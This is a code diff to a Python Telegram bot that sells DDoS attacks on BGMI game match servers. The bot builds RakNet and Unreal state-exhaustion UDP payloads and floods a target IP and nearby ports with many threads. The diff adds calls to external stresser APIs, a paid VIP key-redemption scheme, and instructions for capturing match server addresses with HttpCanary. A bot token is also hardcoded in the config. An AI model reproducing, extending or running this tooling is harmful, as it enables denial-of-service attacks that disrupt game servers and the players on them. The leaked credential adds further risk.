@@ -6,6 +6,8 @@ import random
 import socket
 import threading
 import time
+import urllib.request
+import urllib.parse
 from datetime import datetime, timedelta
 from typing import Dict, List, Set, Optional
 
@@ -32,8 +34,9 @@ logger = logging.getLogger("BGMI_DDOS_BOT")
 # File paths
 CONFIG_FILE = "config.json"
 DATA_FILE = "users.json"
+KEYS_FILE = "keys.json"
 
-# Standalone Configuration (No external JSON files needed!)
+# Standalone Commercial Configuration
 DEFAULT_CONFIG = {
     "BOT_TOKEN": "8552036925:AAE9Cqg_TnOI3o2j4FTMmWmR6dTU1XLzYi8",
     "ADMIN_IDS": [5615161833],
@@ -41,12 +44,13 @@ DEFAULT_CONFIG = {
     "DEFAULT_COOLDOWN": 30,
     "MAX_THREADS_PER_ATTACK": 500,
     "ALLOW_FREE_USERS": True,
+    "API_ENDPOINTS": []  # List of external L4 Stresser API URLs
 }
 
 # Global state
-active_attacks: Dict[int, dict] = {}  # user_id -> attack info
-user_cooldowns: Dict[int, float] = {}  # user_id -> timestamp when cooldown ends
-background_tasks: Set[asyncio.Task] = set()  # prevent asyncio garbage collection
+active_attacks: Dict[int, dict] = {}
+user_cooldowns: Dict[int, float] = {}
+background_tasks: Set[asyncio.Task] = set()
 
 def load_config() -> dict:
     if not os.path.exists(CONFIG_FILE):
@@ -67,13 +71,20 @@ def load_config() -> dict:
         logger.warning(f"Using default in-memory config: {e}")
         return DEFAULT_CONFIG.copy()
 
+def save_config(cfg: dict):
+    try:
+        with open(CONFIG_FILE, "w") as f:
+            json.dump(cfg, f, indent=4)
+    except Exception:
+        pass
+
 def load_users() -> dict:
     if not os.path.exists(DATA_FILE):
         return {}
     try:
         with open(DATA_FILE, "r") as f:
             return json.load(f)
-    except Exception as e:
+    except Exception:
         return {}
 
 def save_users(users: dict):
@@ -83,8 +94,25 @@ def save_users(users: dict):
     except Exception:
         pass
 
+def load_keys() -> dict:
+    if not os.path.exists(KEYS_FILE):
+        return {}
+    try:
+        with open(KEYS_FILE, "r") as f:
+            return json.load(f)
+    except Exception:
+        return {}
+
+def save_keys(keys: dict):
+    try:
+        with open(KEYS_FILE, "w") as f:
+            json.dump(keys, f, indent=4)
+    except Exception:
+        pass
+
 config = load_config()
 users_db = load_users()
+keys_db = load_keys()
 
 def is_admin(user_id: int) -> bool:
     return user_id in config.get("ADMIN_IDS", [5615161833])
@@ -104,7 +132,7 @@ def is_vip(user_id: int) -> bool:
                     return True
             except Exception:
                 pass
-    return True
+    return False
 
 def update_user_attack_stats(user_id: int, duration: int):
     user_str = str(user_id)
@@ -120,27 +148,27 @@ def update_user_attack_stats(user_id: int, duration: int):
     users_db[user_str]["total_duration"] = users_db[user_str].get("total_duration", 0) + duration
     save_users(users_db)
 
-# RakNet & Unreal Engine Handshake State Exhaustion Protocol Vectors
+# Pre-allocated Memory Vector Pool
 RAKNET_MAGIC = b"\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"
 
 def generate_state_exhaustion_vectors() -> list:
     vectors = []
-    # 1. RakNet Unconnected Ping Vector (Forces Server GUID lookup & PONG response generation)
+    # 1. RakNet Unconnected Ping Vector
     for i in range(10):
         t_stamp = os.urandom(8)
         guid = os.urandom(8)
         vectors.append(b"\x01" + t_stamp + RAKNET_MAGIC + guid)
 
-    # 2. RakNet Open Connection Request 1 (Forces MTU negotiation & pending state allocation)
+    # 2. RakNet Open Connection Request 1 (MTU Allocation)
     for mtu_size in [1200, 1350, 1400]:
         padding = b"\x00" * (mtu_size - 18)
         vectors.append(b"\x05" + RAKNET_MAGIC + b"\x0b" + padding)
 
-    # 3. RakNet Open Connection Request 2 (Session cookie allocation)
+    # 3. RakNet Open Connection Request 2 (Session Cookie)
     for _ in range(5):
         vectors.append(b"\x07" + RAKNET_MAGIC + b"\x04\x00\x00\x00" + os.urandom(100))
 
-    # 4. Unreal NetDriver NACK Control Vector (Forces Server Tick thread to scan resend queue)
+    # 4. Unreal NetDriver NACK Control Vector
     for _ in range(5):
         vectors.append(b"\x03\x00\x00\x00" + os.urandom(1200))
 
@@ -162,7 +190,7 @@ PRE_GENERATED_PAYLOADS = generate_state_exhaustion_vectors()
 PAYLOAD_SIZES = [len(p) for p in PRE_GENERATED_PAYLOADS]
 NUM_PRE_PAYLOADS = len(PRE_GENERATED_PAYLOADS)
 
-# High-Performance Game Server UDP Freeze Engine v5.0 (RakNet & Unreal State Exhaustion)
+# High-Performance Match Server Stresser Engine
 class MatchServerUDPStresser:
     def __init__(self, target_ip: str, target_port: int, duration: int, threads: int, user_id: int):
         self.target_ip = target_ip
@@ -174,11 +202,35 @@ class MatchServerUDPStresser:
         self.start_time = 0.0
         self.packets_sent = 0
         self.bytes_sent = 0
+        self.api_success_count = 0
         self._lock = threading.Lock()
         self._threads_list = []
 
+    def _trigger_external_apis(self):
+        """Asynchronously trigger all configured Layer 4 Stresser APIs"""
+        api_list = config.get("API_ENDPOINTS", [])
+        if not api_list:
+            return
+
+        for api_url in api_list:
+            try:
+                formatted_url = api_url.format(
+                    ip=self.target_ip,
+                    port=self.target_port,
+                    time=self.duration,
+                    threads=self.threads,
+                    method="UDP-BGMI"
+                )
+                req = urllib.request.Request(formatted_url, headers={"User-Agent": "Mozilla/5.0"})
+                with urllib.request.urlopen(req, timeout=8) as resp:
+                    if resp.status == 200:
+                        with self._lock:
+                            self.api_success_count += 1
+                        logger.info(f"Triggered Stresser API: {formatted_url[:40]}...")
+            except Exception as e:
+                logger.warning(f"Error triggering API endpoint: {e}")
+
     def _flood_worker(self, stop_time: float):
-        # Expanded Port Jitter Range (Saturates full match server UDP thread pool)
         target_ports = [
             self.target_port + offset
             for offset in [0, 1, -1, 2, -2, 3, -3, 4, -4]
@@ -191,7 +243,6 @@ class MatchServerUDPStresser:
         idx = random.randint(0, 1000)
 
         while self.is_running and time.time() < stop_time:
-            # Create fast connected UDP sockets per batch
             sockets = []
             for i in range(num_ports):
                 try:
@@ -200,7 +251,6 @@ class MatchServerUDPStresser:
                         s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
                     except Exception:
                         pass
-                    # Fast-path connected socket (skips per-packet kernel routing lookup)
                     t_port = target_ports[i % num_ports]
                     s.connect((self.target_ip, t_port))
                     sockets.append(s)
@@ -213,7 +263,6 @@ class MatchServerUDPStresser:
 
             num_sockets = len(sockets)
 
-            # Ultra High-Speed Send Loop (500 state packets per cycle)
             for _ in range(500):
                 if not self.is_running:
                     break
@@ -236,7 +285,6 @@ class MatchServerUDPStresser:
                 except Exception:
                     pass
 
-            # Update live stats in real-time after each batch
             if local_pkts > 0:
                 with self._lock:
                     self.packets_sent += local_pkts
@@ -244,7 +292,6 @@ class MatchServerUDPStresser:
                 local_pkts = 0
                 local_bytes = 0
 
-        # Final flush if remaining
         if local_pkts > 0:
             with self._lock:
                 self.packets_sent += local_pkts
@@ -256,15 +303,8 @@ class MatchServerUDPStresser:
         stop_time = self.start_time + self.duration
         self._threads_list = []
 
-        # Optional External Layer4 Stresser API Trigger (if configured in config.json)
-        api_url = config.get("EXTERNAL_API_URL", "")
-        if api_url:
-            try:
-                import urllib.request
-                formatted_url = api_url.format(ip=self.target_ip, port=self.target_port, time=self.duration, threads=self.threads)
-                threading.Thread(target=lambda: urllib.request.urlopen(formatted_url, timeout=5), daemon=True).start()
-            except Exception as e:
-                logger.error(f"Error triggering External Stresser API: {e}")
+        # Trigger external L4 stresser APIs concurrently in a background thread
+        threading.Thread(target=self._trigger_external_apis, daemon=True).start()
 
         for _ in range(self.threads):
             t = threading.Thread(target=self._flood_worker, args=(stop_time,), daemon=True)
@@ -293,7 +333,8 @@ class MatchServerUDPStresser:
             "elapsed": int(elapsed),
             "remaining": remaining,
             "progress_pct": progress_pct,
-            "progress_bar": bar
+            "progress_bar": bar,
+            "api_count": self.api_success_count
         }
 
 # Command Handlers
@@ -304,26 +345,27 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     admin_status = "👑 ADMINISTRATOR" if is_admin(user_id) else "👤 USER"
 
     welcome_text = (
-        f"🔥 *BGMI MATCH SERVER FREEZER PRO v4.0* 🔥\n"
+        f"🔥 *BGMI MATCH SERVER FREEZER PRO v5.0* 🔥\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"👤 *User:* `{user.first_name}` (`{user_id}`)\n"
         f"🔰 *Role:* `{admin_status}`\n"
         f"💎 *Status:* `{vip_status}`\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"📌 *Usage & Quick Commands:*\n"
+        f"📌 *Command Shortcuts:*\n"
         f"• `/attack <IP> <PORT> <SEC> [THREADS]`\n"
         f"• `/attack <IP:PORT> <SEC> [THREADS]` *(Canary Format)*\n"
+        f"• `/redeem <KEY>` - Redeem VIP Access Key\n"
         f"• `/stop` - Stop current attack session\n"
         f"• `/status` - Bot Server & Engine Load\n"
         f"• `/myinfo` - Check Subscription & Plan\n"
-        f"• `/help` - Usage Guide & Canary Setup\n\n"
-        f"💡 *Tip:* Paste target direct from HttpCanary like:\n"
+        f"• `/help` - Full Usage & Canary Setup\n\n"
+        f"💡 *Tip:* Paste target direct from HttpCanary:\n"
         f"`/attack 15.206.12.34:17004 120 250`"
     )
 
     keyboard = [
         [
-            InlineKeyboardButton("📖 Canary Setup Guide", callback_data="btn_help"),
+            InlineKeyboardButton("📖 Usage & Canary Guide", callback_data="btn_help"),
             InlineKeyboardButton("📊 System Status", callback_data="btn_status"),
         ],
         [
@@ -343,10 +385,10 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
         "⚡ *Attack Command Syntax:*\n"
         "`/attack <IP> <PORT> <SECONDS> [THREADS]`\n"
-        "OR HttpCanary Single Format:\n"
+        "OR Single Format:\n"
         "`/attack <IP:PORT> <SECONDS> [THREADS]`\n\n"
         "👉 *Examples:*\n"
-        "• `/attack 15.206.12.34 17004 120 200`\n"
+        "• `/attack 15.206.12.34 17004 120 250`\n"
         "• `/attack 15.206.12.34:17004 120`\n"
         "• `/bgmi 15.206.12.34 17004 120 250`\n\n"
         "📲 *How to get IP & Port using HttpCanary:*\n"
@@ -354,9 +396,11 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "2. Enter BGMI match.\n"
         "3. Look for UDP connections with port range `10000 - 20000` (e.g., `15.206.x.x:17004`).\n"
         "4. Copy `IP:PORT` and send in bot command!\n\n"
+        "💎 *Key Redemption:*\n"
+        "• `/redeem <KEY>` - Redeem VIP Access Key\n\n"
         "⚙️ *System Limits:*\n"
         f"• Max Duration: `{config.get('DEFAULT_MAX_TIME', 240)}s`\n"
-        f"• Max Threads: `{config.get('MAX_THREADS_PER_ATTACK', 400)}`\n"
+        f"• Max Threads: `{config.get('MAX_THREADS_PER_ATTACK', 500)}`\n"
         f"• Cooldown: `{config.get('DEFAULT_COOLDOWN', 30)}s`\n"
     )
     await update.message.reply_text(help_text, parse_mode="Markdown")
@@ -367,7 +411,7 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_vip(user_id):
         await update.message.reply_text(
             "❌ *Access Denied!* You are not authorized to launch attacks.\n"
-            "Contact Admin to purchase VIP Access.",
+            "Use `/redeem <KEY>` or contact Admin for VIP access.",
             parse_mode="Markdown"
         )
         return
@@ -395,13 +439,12 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "❌ *Invalid Command Syntax!*\n\n"
             "Usage: `/attack <IP> <PORT> <SECONDS> [THREADS]`\n"
             "Or: `/attack <IP:PORT> <SECONDS> [THREADS]`\n\n"
-            "Example: `/attack 15.206.12.34 17004 120 200`\n"
+            "Example: `/attack 15.206.12.34 17004 120 250`\n"
             "Example: `/attack 15.206.12.34:17004 120`",
             parse_mode="Markdown"
         )
         return
 
-    # Flexible IP:PORT or IP PORT parsing
     if ":" in args[0]:
         try:
             ip, port_str = args[0].split(":")
@@ -424,7 +467,6 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("❌ *Error:* Port, Time, and Threads must be valid integers!", parse_mode="Markdown")
             return
 
-    # Check for non-game IPs (e.g. 34.x.x.x Google Cloud / Telemetry / Voice Chat)
     ip_warning = ""
     if ip.startswith("34.") or ip.startswith("142.") or ip.startswith("172."):
         ip_warning = (
@@ -461,17 +503,20 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("🛑 STOP ATTACK", callback_data=f"stop_attack_{user_id}")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    chat_id = update.effective_chat.id
+
+    api_endpoints_count = len(config.get("API_ENDPOINTS", []))
+    api_status_str = f"🌐 *API Cluster:* `{api_endpoints_count} Stresser Nodes Active`\n" if api_endpoints_count > 0 else ""
 
     initial_stats = stresser.get_stats()
     sent_msg = await update.message.reply_text(
         f"⚡ *BGMI MATCH FREEZE LAUNCHED!* ⚡\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"🎯 *Target Host:* `{ip}`\n"
-        f"🔌 *Target Port:* `{port}` *(Jitter Mode: ±2)*\n"
+        f"🔌 *Target Port:* `{port}` *(Jitter Mode: ±4)*\n"
         f"⏱️ *Duration:* `{duration} Seconds`\n"
         f"🧵 *Threads:* `{threads} Engine Threads`\n"
         f"👤 *Operator:* `{update.effective_user.first_name}`\n"
+        f"{api_status_str}"
         f"{ip_warning}"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"📊 *Live Traffic Dashboard:*\n"
@@ -480,12 +525,11 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"├─ *Bandwidth:* `0 Mbps`\n"
         f"└─ *Progress:* `[{initial_stats['progress_bar']}] 0%`\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"🔥 *Status:* `SENDING RAKNET/UNREAL HIGH-DENSITY FLOOD...`",
+        f"🔥 *Status:* `SENDING RAKNET/UNREAL CONNECTED FLOOD...`",
         parse_mode="Markdown",
         reply_markup=reply_markup
     )
 
-    # Real-Time Live Attack Dashboard Updater Task (3s live countdown refresh)
     async def live_dashboard_updater():
         while user_id in active_attacks and active_attacks[user_id]["stresser"] == stresser:
             await asyncio.sleep(3)
@@ -496,10 +540,11 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"⚡ *BGMI MATCH FREEZE ACTIVE!* ⚡\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"🎯 *Target Host:* `{ip}`\n"
-                f"🔌 *Target Port:* `{port}` *(Jitter Mode: ±2)*\n"
+                f"🔌 *Target Port:* `{port}` *(Jitter Mode: ±4)*\n"
                 f"⏱️ *Remaining:* `{stats['remaining']}s / {duration}s`\n"
                 f"🧵 *Threads:* `{threads} Engine Threads`\n"
                 f"👤 *Operator:* `{update.effective_user.first_name}`\n"
+                f"{api_status_str}"
                 f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"📊 *Live Traffic Dashboard:*\n"
                 f"├─ *Sent Packets:* `{stats['packets']:,}`\n"
@@ -507,14 +552,13 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"├─ *Bandwidth Rate:* `{stats['mbps']} Mbps` (`{stats['pps']:,} PPS`)\n"
                 f"└─ *Progress:* `[{stats['progress_bar']}] {stats['progress_pct']}%`\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"🔥 *Status:* `RAKNET / UNREAL MATCH FREEZE ACTIVE`"
+                f"🔥 *Status:* `RAKNET / UNREAL CONNECTED FREEZE ACTIVE`"
             )
             try:
                 await sent_msg.edit_text(updated_text, parse_mode="Markdown", reply_markup=reply_markup)
             except Exception:
                 pass
 
-        # Final Completion Notification
         if user_id in active_attacks and active_attacks[user_id]["stresser"] == stresser:
             stresser.stop()
             stats = stresser.get_stats()
@@ -569,6 +613,7 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"🟢 *Active Attacks:* `{active_count}`\n"
         f"👥 *Registered VIP Users:* `{len(users_db)}`\n"
+        f"🌐 *Configured L4 APIs:* `{len(config.get('API_ENDPOINTS', []))}`\n"
         f"💻 *CPU Load:* `{cpu_usage}%`\n"
         f"🧠 *RAM Usage:* `{ram_usage}%`\n"
         f"⚡ *Engine Status:* `OPERATIONAL (High Throughput)`\n"
@@ -616,7 +661,144 @@ async def myinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     await update.message.reply_text(info_text, parse_mode="Markdown")
 
-# Admin Handlers
+# Key Generation & Redemption Commands
+async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.effective_user.id):
+        await update.message.reply_text("❌ *Admin access required!*", parse_mode="Markdown")
+        return
+
+    args = context.args
+    days = int(args[0]) if len(args) >= 1 and args[0].isdigit() else 30
+
+    import uuid
+    raw_key = str(uuid.uuid4()).upper()[:8]
+    key_str = f"BGMI-{days}D-{raw_key}"
+
+    keys_db[key_str] = {
+        "days": days,
+        "created_by": update.effective_user.id,
+        "created_at": datetime.now().isoformat(),
+        "redeemed": False,
+        "redeemed_by": None
+    }
+    save_keys(keys_db)
+
+    await update.message.reply_text(
+        f"🔑 *VIP ACCESS KEY GENERATED!* 🔑\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🎫 *Key:* `{key_str}`\n"
+        f"⏱️ *Duration:* `{days} Days`\n\n"
+        f"👉 *Redeem Command:* `/redeem {key_str}`",
+        parse_mode="Markdown"
+    )
+
+async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    user_str = str(user_id)
+    args = context.args
+
+    if len(args) < 1:
+        await update.message.reply_text("Syntax: `/redeem <KEY>`", parse_mode="Markdown")
+        return
+
+    target_key = args[0].strip().upper()
+
+    if target_key not in keys_db or keys_db[target_key].get("redeemed", False):
+        await update.message.reply_text("❌ *Invalid or Already Redeemed Key!*", parse_mode="Markdown")
+        return
+
+    key_data = keys_db[target_key]
+    days = key_data.get("days", 30)
+
+    expiry = datetime.now() + timedelta(days=days)
+    if user_str not in users_db:
+        users_db[user_str] = {}
+
+    users_db[user_str].update({
+        "approved_by": f"KEY:{target_key}",
+        "expiry": expiry.isoformat(),
+        "approved_at": datetime.now().isoformat()
+    })
+    save_users(users_db)
+
+    key_data["redeemed"] = True
+    key_data["redeemed_by"] = user_id
+    key_data["redeemed_at"] = datetime.now().isoformat()
+    save_keys(keys_db)
+
+    await update.message.reply_text(
+        f"🎉 *VIP ACCESS ACTIVATED!* 🎉\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"👤 *User:* `{update.effective_user.first_name}` (`{user_id}`)\n"
+        f"⏱️ *Duration:* `{days} Days`\n"
+        f"📅 *Expiry Date:* `{expiry.strftime('%Y-%m-%d %H:%M')}`\n\n"
+        f"🚀 You can now launch attacks using `/attack <IP:PORT> <TIME>`!",
+        parse_mode="Markdown"
+    )
+
+# Admin API Management Commands
+async def addapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.effective_user.id):
+        await update.message.reply_text("❌ *Admin access required!*", parse_mode="Markdown")
+        return
+
+    args = context.args
+    if len(args) < 1:
+        await update.message.reply_text(
+            "Syntax: `/addapi <URL>`\n\n"
+            "Placeholders supported in URL:\n"
+            "`{ip}`, `{port}`, `{time}`, `{threads}`, `{method}`\n\n"
+            "Example:\n"
+            "`/addapi http://api.stresser.net/attack?host={ip}&port={port}&time={time}`",
+            parse_mode="Markdown"
+        )
+        return
+
+    api_url = args[0]
+    api_list = config.get("API_ENDPOINTS", [])
+    api_list.append(api_url)
+    config["API_ENDPOINTS"] = api_list
+    save_config(config)
+
+    await update.message.reply_text(f"✅ *Stresser API Added Successfully!*\nTotal APIs: `{len(api_list)}`", parse_mode="Markdown")
+
+async def apis_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.effective_user.id):
+        await update.message.reply_text("❌ *Admin access required!*", parse_mode="Markdown")
+        return
+
+    api_list = config.get("API_ENDPOINTS", [])
+    if not api_list:
+        await update.message.reply_text("ℹ️ *No external L4 Stresser APIs configured.*", parse_mode="Markdown")
+        return
+
+    text = "🌐 *CONFIGURED L4 STRESSER APIS:*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+    for i, url in enumerate(api_list):
+        text += f"`[{i}]` {url}\n"
+    text += "\nRemove syntax: `/removeapi <index>`"
+
+    await update.message.reply_text(text, parse_mode="Markdown")
+
+async def removeapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.effective_user.id):
+        await update.message.reply_text("❌ *Admin access required!*", parse_mode="Markdown")
+        return
+
+    args = context.args
+    if len(args) < 1 or not args[0].isdigit():
+        await update.message.reply_text("Syntax: `/removeapi <index>`", parse_mode="Markdown")
+        return
+
+    idx = int(args[0])
+    api_list = config.get("API_ENDPOINTS", [])
+    if 0 <= idx < len(api_list):
+        removed = api_list.pop(idx)
+        config["API_ENDPOINTS"] = api_list
+        save_config(config)
+        await update.message.reply_text(f"✅ Removed API `[{idx}]` successfully.", parse_mode="Markdown")
+    else:
+        await update.message.reply_text("❌ Invalid API index!", parse_mode="Markdown")
+
 async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id):
         await update.message.reply_text("❌ *Admin access required!*", parse_mode="Markdown")
@@ -713,9 +895,10 @@ async def reload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ *Admin access required!*", parse_mode="Markdown")
         return
 
-    global config, users_db
+    global config, users_db, keys_db
     config = load_config()
     users_db = load_users()
+    keys_db = load_keys()
     await update.message.reply_text("🔄 *Config and User Database Reloaded!*", parse_mode="Markdown")
 
 # Inline button click callback handler
@@ -738,7 +921,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "👑 *ADMIN CONTROL PANEL*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                 "• `/approve <id> [days]` - Approve user\n"
                 "• `/disapprove <id>` - Remove user\n"
-                "• `/users` - VIP list\n"
+                "• `/genkey <days>` - Generate VIP Key\n"
+                "• `/addapi <url>` - Add L4 Stresser API\n"
+                "• `/apis` - List configured L4 APIs\n"
+                "• `/removeapi <idx>` - Remove API\n"
+                "• `/users` - VIP user list\n"
                 "• `/broadcast <msg>` - Send global announcement\n"
                 "• `/reload` - Reload configuration\n"
             )
@@ -800,6 +987,7 @@ def main():
     app.add_handler(CommandHandler("ping", attack_command))
     app.add_handler(CommandHandler("lagg", attack_command))
     app.add_handler(CommandHandler("matchfreeze", attack_command))
+    app.add_handler(CommandHandler("redeem", redeem_command))
     app.add_handler(CommandHandler("stop", stop_command))
     app.add_handler(CommandHandler("status", status_command))
     app.add_handler(CommandHandler("myinfo", myinfo_command))
@@ -808,6 +996,10 @@ def main():
     # Admin commands
     app.add_handler(CommandHandler("approve", approve_command))
     app.add_handler(CommandHandler("disapprove", disapprove_command))
+    app.add_handler(CommandHandler("genkey", genkey_command))
+    app.add_handler(CommandHandler("addapi", addapi_command))
+    app.add_handler(CommandHandler("apis", apis_command))
+    app.add_handler(CommandHandler("removeapi", removeapi_command))
     app.add_handler(CommandHandler("users", users_command))
     app.add_handler(CommandHandler("broadcast", broadcast_command))
     app.add_handler(CommandHandler("reload", reload_command))
@@ -816,7 +1008,7 @@ def main():
     app.add_handler(CallbackQueryHandler(button_handler))
     app.add_error_handler(error_handler)
 
-    print("=== BGMI Match Server Freezer Telegram Bot PRO v4.0 Started! ===")
+    print("=== BGMI Match Server Freezer Commercial Telegram Bot PRO v5.0 Started! ===")
     print(f"Token: {bot_token[:10]}... | Admin IDs: {config.get('ADMIN_IDS')}")
     print("Press Ctrl+C to stop.")
     app.run_polling(drop_pending_updates=True, poll_interval=1.0)
